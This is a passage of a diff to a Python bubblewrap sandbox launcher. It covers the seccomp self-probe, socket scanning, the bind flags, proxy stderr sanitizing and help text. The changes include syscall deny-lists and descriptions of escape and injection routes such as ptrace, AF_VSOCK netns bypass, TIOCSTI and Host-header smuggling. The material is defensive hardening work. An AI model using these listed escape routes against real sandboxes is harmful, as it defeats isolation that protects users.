-    ptrace(PTRACE_ATTACH, 0). Anything but -1/EPERM means the deny-list
+    (the netns-bypass family the gate refuses), personality(0),
+    ptrace(PTRACE_ATTACH, 0), and — as an ALLOW check — the
+    personality(0xffffffff) query (setarch reads it; a filter that denies
+    the query breaks such reads silently). Anything but -1/EPERM on the
+    denies (or EPERM on the allow) means the deny-list
     is not what we think, and the launcher refuses to run (--no-seccomp
     is the explicit opt-out and never reaches here). Coverage note: this
-    probe SAMPLES the table — five entries whose numbers the libc
+    probe SAMPLES the table — six entries whose numbers the libc
     wrappers pin down; the remaining hand-typed numbers are verified only
     by tests/test_seccomp.py (kernel headers / scmp_sys_resolver /
     ausyscall cross-checks), so run it after touching SECCOMP_SYSCALLS.
@@ -1865,6 +2176,10 @@ def seccomp_selfprobe(bpf: bytes) -> None:
                 os._exit(31)
             if not denied(lambda: libc.personality(0)):
                 os._exit(32)
+            # ... and the 0xffffffff QUERY must stay ALLOWED — setarch-style
+            # reads would silently break if the filter denied it too.
+            if denied(lambda: libc.personality(ctypes.c_uint(PERSONALITY_QUERY))):
+                os._exit(34)
             # PTRACE_ATTACH to pid 0 errors either way; EPERM only under
             # the filter.
             if not denied(lambda: libc.ptrace(16, 0, 0, 0)):
@@ -1882,6 +2197,7 @@ def seccomp_selfprobe(bpf: bytes) -> None:
         31: "socket(AF_VSOCK) was not denied by the filter",
         32: "personality(0) was not denied by the filter",
         33: "ptrace(PTRACE_ATTACH) was not denied by the filter",
+        34: "personality(0xffffffff) query was not ALLOWED by the filter",
         4: "probe child crashed",
         5: "cannot install seccomp filters here (prctl PR_SET_SECCOMP)",
     }.get(exit_code, "probe child died unexpectedly")
@@ -2262,25 +2578,50 @@ def _contains_socket(root: str, max_depth: int = 3, max_entries: int = 5000,
     must not turn the cap into "walk everything"), and hitting the cap is
     FAIL-OPEN by design (ordinary big trees must keep binding) — so it says
     so on stderr, but at most once a day (or with --verbose): a large cwd
-    would otherwise print it on EVERY launch. `shown` is the HOST-path
-    spelling for that note (root is often a /proc/self/fd/N pin)."""
+    would otherwise print it on EVERY launch. UNREADABLE directories (a
+    0711 subdir the scan cannot list) are skipped with a note too — on
+    EVERY launch, under their own stamp (none): unlike the cap this is rare
+    and a socket connectable by name could hide there, so an earlier
+    gave-up note must not silence it. `shown` is the HOST-path spelling for
+    those notes (root is often a /proc/self/fd/N pin)."""
     n = 0
-    for dirpath, dirnames, filenames in os.walk(root):
+    unreadable: list[str] = []
+
+    def on_walk_error(err: OSError) -> None:
+        if err.filename:
+            unreadable.append(err.filename)
+
+    def note(msg: str) -> None:
+        # Lossy like the scan itself: at most once a day or with --verbose,
+        # so an ordinary large cwd does not print on every launch.
+        if verbose or not note_recently_shown("socket-scan-gaveup.note"):
+            mark_note_shown("socket-scan-gaveup.note")
+            err(f"note: socket scan of {shown or root} {msg} — the bind is "
+                "allowed, but an unscanned socket could lurk there; "
+                "--bind-socket is only needed when you know there is one")
+
+    for dirpath, dirnames, filenames in os.walk(root, onerror=on_walk_error):
         if dirpath[len(root):].count("/") >= max_depth:
             dirnames[:] = []
         for name in dirnames + filenames:
             n += 1
             if n > max_entries:
-                if verbose or not note_recently_shown("socket-scan-gaveup.note"):
-                    mark_note_shown("socket-scan-gaveup.note")
-                    err(f"note: socket scan of {shown or root} gave up after "
-                        f"{max_entries} entries (depth <= {max_depth}) — the bind "
-                        "is allowed, but an unscanned socket could lurk there; "
-                        "--bind-socket is only needed when you know there is one")
+                note(f"gave up after {max_entries} entries (depth <= {max_depth})")
                 return None
             p = os.path.join(dirpath, name)
             if _is_socket(p):
                 return p
+    if unreadable:
+        first = unreadable[0]
+        if first.startswith(root):
+            first = shown + first[len(root):] if shown else first
+        # No stamp, no --verbose gate: rare, and each launch binds the tree
+        # anew (an unreadable dir can appear between launches).
+        err(f"note: socket scan of {shown or root} could not read "
+            f"{len(unreadable)} director{'ies' if len(unreadable) > 1 else 'y'} "
+            f"(e.g. {first}) — the bind is allowed, but an unscanned socket "
+            "could lurk there; --bind-socket is only needed when you know "
+            "there is one")
     return None
 
 
@@ -2439,7 +2780,7 @@ def check_bind_paths(opts, home: str,
     """
     binds: list[tuple[str, str, int | None]] = []
     bound: set[str] = set()  # resolved paths already emitting a mount
-    for label, flag, paths in (
+    for label, default_flag, paths in (
         ("--bind", "--bind", opts.bind),
         ("--ro-bind", "--ro-bind", opts.ro_bind),
         # --bind-socket's mount flag is decided per path below: read-only
@@ -2447,6 +2788,12 @@ def check_bind_paths(opts, home: str,
         ("--bind-socket", "--ro-bind", opts.bind_socket),
     ):
         for p in paths:
+            # Re-seed the flag for EVERY path: the --bind-socket branch
+            # below overwrites it for plain directories, and a stale rw
+            # decision used to carry into the NEXT path of the same group
+            # (plain dir, then a runtime-dir socket -> the socket mounted
+            # READ-WRITE — exactly the impersonation the rules refuse).
+            flag = default_flag
             refusal, warning, rp, fd = validate_bind_source(pinner, label, p, opts, home)
             if refusal:
                 die(f"{refusal}; refusing")
@@ -2604,9 +2951,18 @@ def build_bwrap(opts, sand: str, sock: str, home: str,
         inner = INNER_PROXY
     else:
         # --share-net keeps the host network namespace (only valid together
-        # with --unshare-all); resolv.conf makes DNS work. NOTE: this also
-        # exposes host loopback services and abstract Unix sockets.
-        bw += ["--share-net", "--ro-bind-try", "/etc/resolv.conf", "/etc/resolv.conf"]
+        # with --unshare-all); resolv.conf makes DNS work, nsswitch.conf/
+        # services/protocols keep glibc's resolver and getservbyname()
+        # faithful ("https" used to fail to resolve to 443). NOTE: sharing
+        # the netns also exposes host loopback services and abstract Unix
+        # sockets.
+        bw += [
+            "--share-net",
+            "--ro-bind-try", "/etc/resolv.conf", "/etc/resolv.conf",
+            "--ro-bind-try", "/etc/nsswitch.conf", "/etc/nsswitch.conf",
+            "--ro-bind-try", "/etc/services", "/etc/services",
+            "--ro-bind-try", "/etc/protocols", "/etc/protocols",
+        ]
         inner = INNER_DIRECT
 
     if opts.home:
@@ -2731,10 +3087,14 @@ def build_bwrap(opts, sand: str, sock: str, home: str,
     return bw, inner, duped
 
 
-def wait_for_socket(sock_path: str, proc: subprocess.Popen, timeout: float = 5.0) -> None:
+def wait_for_socket(sock_path: str, proc: subprocess.Popen, timeout: float = 5.0,
+                    err_drain=None) -> None:
     """Wait until the proxy is actually accepting connections. The socket
     file appears at bind() time, before listen(), so existence alone is not
-    enough — poll with a real connect() to avoid an ECONNREFUSED race."""
+    enough — poll with a real connect() to avoid an ECONNREFUSED race.
+    err_drain (set when the proxy's stderr is a pipe under
+    --filter-output) prints the buffered log before dying: the
+    "see errors above" message assumes the errors could reach the user."""
     deadline = time.monotonic() + timeout
     while time.monotonic() < deadline:
         if os.path.exists(sock_path):
@@ -2747,8 +3107,12 @@ def wait_for_socket(sock_path: str, proc: subprocess.Popen, timeout: float = 5.0
             finally:
                 probe.close()
         if proc.poll() is not None:
+            if err_drain:
+                err_drain()
             die("the proxy died at startup (see errors above)")
         time.sleep(0.02)
+    if err_drain:
+        err_drain()
     die("the proxy did not come up")
 
 
@@ -2820,6 +3184,7 @@ def run_sandbox(opts, command: list[str], allows: list[dict], upstream: dict | N
                                      # ALSO mean a C handler — hence the flag)
     winch = {"hit": False}           # mutable: the signal handler flips it
     sanitizer: OutputSanitizer | None = None
+    proxy_log: OutputSanitizer | None = None  # --filter-output proxy stderr
     try:
         # mkdtemp inside the try: early_signal raises SystemExit, and a
         # signal landing anywhere between mkdtemp() and the setup below must
@@ -2891,14 +3256,48 @@ def run_sandbox(opts, command: list[str], allows: list[dict], upstream: dict | N
             # Created 0600 from the start — it may carry upstream credentials.
             fd = os.open(cfg_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
             with os.fdopen(fd, "w", encoding="utf-8") as fh:
-                json.dump({"allows": allows, "upstream": upstream, "verbose": opts.verbose}, fh)
+                json.dump({
+                    "allows": allows, "upstream": upstream,
+                    "no_proxy": no_proxy_from_env(os.environ),
+                    "verbose": opts.verbose,
+                }, fh)
+            # Under --filter-output the proxy's stderr (allow/deny log,
+            # tracebacks) is a PIPE, not the raw host tty: it would both
+            # bypass the output filter (tracebacks can quote sandbox-
+            # supplied bytes) and staircase without CR while the tty is
+            # raw. The pump loop sanitizes and emits it below; the log is
+            # only ever written in --verbose, so normally nothing flows.
+            proxy_log = OutputSanitizer() if opts.filter_output else None
             proxy = subprocess.Popen(
                 [sys.executable, os.path.abspath(__file__), "--_proxy", sock, cfg_path, str(os.getpid())],
                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,  # logs go to stderr
+                stderr=subprocess.PIPE if proxy_log is not None else None,
                 start_new_session=True,  # keep terminal Ctrl-C out of the proxy's way
             )
+            if proxy.stderr is not None:
+                os.set_blocking(proxy.stderr.fileno(), False)
             procs.append(proxy)
-            wait_for_socket(sock, proxy)
+
+            def flush_proxy_log() -> None:
+                """Non-blocking drain (the fd is O_NONBLOCK, so this stops
+                at the first EAGAIN/EOF): the proxy is dead or idle by now,
+                and whatever is left in the pipe gets emitted sanitized."""
+                if proxy.stderr is None:
+                    return
+                data = b""
+                while len(data) < 65536:
+                    try:
+                        chunk = os.read(proxy.stderr.fileno(), 65536)
+                    except OSError:
+                        break
+                    if not chunk:
+                        break
+                    data += chunk
+                if data:
+                    _emit_diag(proxy_log.feed(data))
+
+            wait_for_socket(sock, proxy,
+                            err_drain=flush_proxy_log if proxy.stderr is not None else None)
             # The proxy has read its config by now (it accepted a connection);
             # drop the file so a SIGKILLed launcher cannot leave credentials
             # behind in /tmp.
@@ -3042,6 +3441,8 @@ def run_sandbox(opts, command: list[str], allows: list[dict], upstream: dict | N
         # Supervisor: if the proxy dies, tear the sandbox down (and vice versa).
         while sandbox.poll() is None:
             if proxy is not None and proxy.poll() is not None:
+                if proxy.stderr is not None and proxy_log is not None:
+                    flush_proxy_log()  # final words (sanitized) before the note
                 err("the network proxy exited unexpectedly — shutting the sandbox down")
                 sandbox.terminate()
                 try:
@@ -3060,6 +3461,13 @@ def run_sandbox(opts, command: list[str], allows: list[dict], upstream: dict | N
                 if tty_fd is not None:
                     _copy_winsize(tty_fd, master)
             fds = [] if master_eof else [master]
+            # --filter-output: the proxy's piped stderr through the same
+            # select round (sanitized: tracebacks can quote sandbox bytes).
+            proxy_err = (proxy.stderr.fileno()
+                         if proxy is not None and proxy.stderr is not None
+                         and proxy.poll() is None else None)
+            if proxy_err is not None:
+                fds.append(proxy_err)
             # Backpressure, not drops: stop SELECTING on stdin while the
             # backlog is at the cap — the tty stays readable, we just read
             # again once the sandbox drained some of it.
@@ -3073,6 +3481,13 @@ def run_sandbox(opts, command: list[str], allows: list[dict], upstream: dict | N
                 ready, _, _ = select.select(fds, [], [], 0.1)
             except OSError:
                 continue
+            if proxy_err is not None and proxy_err in ready:
+                try:
+                    data = os.read(proxy_err, 4096)
+                except (BlockingIOError, InterruptedError, OSError):
+                    data = b""
+                if data:
+                    _emit_diag(proxy_log.feed(data))
             if master in ready:
                 data = _read_maybe(master)
                 if data == b"":
@@ -3156,8 +3571,15 @@ def run_sandbox(opts, command: list[str], allows: list[dict], upstream: dict | N
 
 OPTS_WITH_VALUE = {
     "-a", "--allow", "-A", "--allow-file", "-b", "--bind", "-r", "--ro-bind",
-    "--bind-socket", "--upstream", "--_proxy",
+    "--bind-socket", "--upstream",
 }
+
+# Options that consume MORE than one value (argparse nargs): split_argv
+# must skip their values exactly like argparse does. --_proxy is the
+# internal re-exec flag (SOCK CFG PPID) — it is normally argv[0] and
+# handled by the main() shortcut, but the tokenizer stays correct for any
+# placement instead of silently mis-splitting the tokens after it.
+OPTS_MULTI_VALUE = {"--_proxy": 3}
 
 # The short members of OPTS_WITH_VALUE — derived, not hand-maintained, so
 # the trap list stays the single source of truth. Their ATTACHED forms
@@ -3181,9 +3603,13 @@ def split_argv(argv: list[str]) -> tuple[list[str], list[str]]:
         if tok == "--":
             return argv[:i], argv[i + 1:]
         if tok.startswith("-") and tok != "-":
-            # "--allow x" consumes two tokens; "--allow=x" (or a flag) one.
+            # "--allow x" consumes two tokens; "--allow=x" (or a flag) one;
+            # "--_proxy a b c" consumes nargs+1 (OPTS_MULTI_VALUE).
             if "=" not in tok and tok in OPTS_WITH_VALUE:
                 i += 2
+                continue
+            if "=" not in tok and tok in OPTS_MULTI_VALUE:
+                i += 1 + OPTS_MULTI_VALUE[tok]
                 continue
             base = tok.split("=", 1)[0]
             if not tok.startswith("--") and len(base) > 2 \
@@ -3211,11 +3637,20 @@ def parse_cli(argv: list[str]):
 By default the sandbox has no network except a SOCKS5 *and* HTTP-CONNECT
 proxy (auto-detected) at 127.0.0.1:1080 — http_proxy/https_proxy/all_proxy
 are pre-set. https:// always goes through CONNECT; plain http:// URLs are
-forwarded (absolute-form). Destinations not on the allowlist are denied
+forwarded (absolute-form) as exactly ONE request: Host is rewritten from
+the checked URL, header names must be valid tokens (no obs-fold),
+Transfer-Encoding is refused and only an unambiguous Content-Length body
+is forwarded before the origin socket is half-closed — a pipelined second
+request cannot smuggle its own Host upstream. Destinations not on the
+allowlist are denied
 BEFORE any DNS lookup happens. Hostnames are resolved host-side; answers in
 private, loopback, link-local or CGNAT ranges are rejected, so allowed names
 cannot reach host/LAN services (explicit -a IP/CIDR entries bypass that
-guard; effectively catch-all networks such as 0.0.0.0/1 are refused).
+guard, as does -a NAME!private for that one name — for internal mirrors;
+effectively catch-all networks such as 0.0.0.0/1 are refused).
+$NO_PROXY/$no_proxy (lowercase winning, curl semantics) only picks the
+route when chaining; entries are host suffixes, IP literals/CIDRs (literal
+destinations only) or '*'.
 --net drops the proxy and shares the host network namespace instead.
 
 Notes:
@@ -3297,17 +3732,20 @@ Notes:
     keyring, namespace (unshare/setns/clone3/clone-with-CLONE_NEWUSER),
     admin (mount/pivot_root/chroot/kexec/module loading/open_by_handle_at/
     name_to_handle_at/quotactl/syslog and the new mount API fsopen/fsmount/
-    fspick/move_mount/...), process-inspection/injection (ptrace, process_vm_*/
-    kcmp/pidfd_getfd/personality, vmsplice), fanotify_init and
+    fspick/move_mount/...), process-inspection/injection (ptrace,
+    process_vm_readv/writev, kcmp, pidfd_getfd, vmsplice) and personality
+    CHANGES (the harmless 0xffffffff persona-query call stays allowed;
+    setarch -R et al. still need --no-seccomp), fanotify_init and
     ioctl(TIOCSTI/TIOCLINUX) are refused inside the sandbox; socket() is
     limited to AF_UNIX/AF_INET/AF_INET6/AF_NETLINK (AF_VSOCK bypasses
     netns isolation in VM guests on older kernels) — ENOSYS where runtimes
     have fallbacks, EPERM otherwise; foreign-ABI binaries (e.g. 32-bit
     compat, x32) are killed. Every launch self-probes the compiled filter
     host-side first (install it in a forked child; the libc unshare(),
-    ioctl(TIOCSTI), socket(AF_VSOCK), personality and ptrace wrappers
-    must all come back EPERM — the hand-typed numbers are verified on
-    THIS machine; the probe samples five entries, the full table is
+    ioctl(TIOCSTI), socket(AF_VSOCK), personality(0) and ptrace wrappers
+    must all come back denied while the personality(0xffffffff) query
+    stays allowed — the hand-typed numbers are verified on
+    THIS machine; the probe samples six entries, the full table is
     pinned by tests/test_seccomp.py — run it after editing the tables).
     bwrap itself installs the filter right before
     exec'ing the payload (no python3 needed inside the sandbox), so
@@ -3318,9 +3756,8 @@ Notes:
     number (probed once per launch with the same namespace/pid flags as
     the real argv; hosts where that combination cannot run — e.g. setuid
     bwrap without unprivileged user namespaces — keep working on the
-    deny rules alone, with a note shown at most once a day). FAILS
-    CLOSED: without
-    seccomp support (bwrap < 0.4.1) or on an
+    deny rules alone, with a note shown at most once a day). FAILS CLOSED:
+    without seccomp support (bwrap < 0.4.1) or on an
     unsupported architecture the launcher refuses to run — --no-seccomp is
     the explicit opt-out (needed for perf, io_uring runtimes, unshare-
     based builders, keyring-using kerberos, debuggers (gdb/strace), setarch
@@ -3331,7 +3768,8 @@ Notes:
     safe SGR colors pass; OSC strings (clipboard writes, titles,
     hyperlinks), DCS/APC/PM/SOS, non-SGR CSI (cursor moves, screen
     clears, device queries), 2-byte ESC sequences, other C0/C1 controls
-    and bidi/zero-width characters are dropped. WITHOUT it, raw sandbox
+    and bidi/zero-width/blank-rendering/variation-selector characters are
+    dropped. WITHOUT it, raw sandbox
     bytes reach your terminal unchanged — use it for untrusted work. The
     host tty goes raw (stdin and SIGWINCH forwarded, termios restored on
     exit); NON-tty stdin (a pipe, file, /dev/null) is inherited by the
@@ -3359,7 +3797,10 @@ Examples:
     )
     parser.add_argument("-a", "--allow", action="append", default=[], metavar="HOST",
                         help="Allow HOST or any subdomain (suffix match on a dot boundary); "
-                             "IP/CIDR entries match literal IP destinations; optional :port. Repeatable.")
+                             "IP/CIDR entries match literal IP destinations; optional :port. "
+                             "A trailing !private (mirror.corp!private) lets that one NAME "
+                             "resolve into private ranges (internal mirrors; IP/CIDR entries "
+                             "bypass the guard anyway). Repeatable.")
     parser.add_argument("-A", "--allow-file", action="append", default=[], metavar="FILE",
                         help="File with allow entries (one per line, '#' comments). Repeatable.")
     parser.add_argument("-b", "--bind", action="append", default=[], metavar="PATH",
@@ -3406,9 +3847,13 @@ Examples:
     parser.add_argument("--upstream", metavar="URL",
                         help="Egress through an upstream proxy: http://, https://, socks5://, socks5h:// "
                              "(userinfo supported). Default: $SBOX_UPSTREAM, else $https_proxy/$HTTPS_PROXY. "
-                             "Pass an empty string to force direct egress.")
+                             "Pass an empty string to force direct egress. $NO_PROXY/$no_proxy is honored "
+                             "when chaining — also with an explicit --upstream; lowercase $no_proxy wins; "
+                             "matching hosts egress direct and the allowlist still applies.")
     parser.add_argument("--upstream-insecure", action="store_true",
-                        help="Do not verify the upstream's TLS certificate (https:// upstreams).")
+                        help="Do not verify the upstream's TLS certificate (https:// upstreams). "
+                             "Env: $SBOX_UPSTREAM_INSECURE=1 (only 1/true/yes/on count — a bare '0' "
+                             "does NOT disable verification).")
     parser.add_argument("--net", action="store_true",
                         help="Share the host network namespace: direct egress, DNS via the host resolver, "
                              "no proxy/allowlist (-a/-A/--upstream are ignored).")
@@ -3418,8 +3863,10 @@ Examples:
                              "mount/kexec/module-loading, ptrace/process_vm_* and friends are blocked with "
                              "ENOSYS/EPERM inside the sandbox). Note the launcher FAILS CLOSED without it: "
                              "when the filter cannot be installed (bwrap < 0.4.1, unsupported architecture) "
-                             "or fails its startup self-probe (unshare(0) not denied) it refuses to run "
-                             "instead of running unfiltered.")
+                             "or fails its startup self-probe (six sampled calls — unshare(0), "
+                             "ioctl(TIOCSTI), socket(AF_VSOCK), personality(0), ptrace must come back "
+                             "denied, and the personality(0xffffffff) query must stay allowed) it refuses "
+                             "to run instead of running unfiltered.")
     parser.add_argument("-v", "--verbose", action="store_true", help="Log allow/deny decisions to stderr.")
     parser.add_argument("--shell", action="store_true", help="Run an interactive shell ($SHELL if available).")
     parser.add_argument("--_proxy", nargs=3, metavar=("SOCK", "CFG", "PPID"), help=argparse.SUPPRESS)
@@ -3428,13 +3875,15 @@ Examples:
 
 
 def main(argv: list[str]) -> int:
+    # The ONLY legitimate --_proxy caller is this file re-executing itself
+    # as the host-side proxy with exactly this argv shape; a --_proxy seen
+    # anywhere else is not honored as a re-exec (it is just a hidden,
+    # inert option — split_argv still skips its three values).
     if argv[:1] == ["--_proxy"]:
         if len(argv) != 4:
             die("internal error: --_proxy needs SOCK CFG PPID")
         return proxy_main(argv[1], argv[2], int(argv[3]))
     parser, opts, command = parse_cli(argv)
-    if opts._proxy:
-        return proxy_main(*opts._proxy)
     if opts.strict_crlf:
         opts.filter_output = True  # --strict-crlf is a --filter-output mode
 
@@ -3479,7 +3928,7 @@ def main(argv: list[str]) -> int:
             raw = os.environ.get("SBOX_UPSTREAM") or os.environ.get("https_proxy") or os.environ.get("HTTPS_PROXY") or ""
         else:
             raw = opts.upstream
-        upstream = parse_upstream(raw, opts.upstream_insecure or bool(os.environ.get("SBOX_UPSTREAM_INSECURE")))
+        upstream = parse_upstream(raw, opts.upstream_insecure or _env_flag("SBOX_UPSTREAM_INSECURE"))
 
         return run_sandbox(opts, command, allows, upstream)
     except KeyboardInterrupt:
